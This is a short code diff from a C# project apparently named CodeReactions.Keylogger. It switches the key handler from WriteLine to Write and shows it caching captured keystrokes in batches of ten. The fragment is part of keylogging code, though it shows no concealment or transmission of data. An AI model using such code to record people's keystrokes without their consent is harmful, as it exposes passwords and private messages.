@@ -21,7 +21,7 @@ namespace CodeReactions.Keylogger
 
 		protected override void HandleKey(Keys key)
 		{
-			Console.Out.WriteLine(key);
+			Console.Out.Write(key);
 			this.cachedKeys.Add(Convert.ToChar((int)key));
 
 			if (this.cachedKeys.Count >= 10)
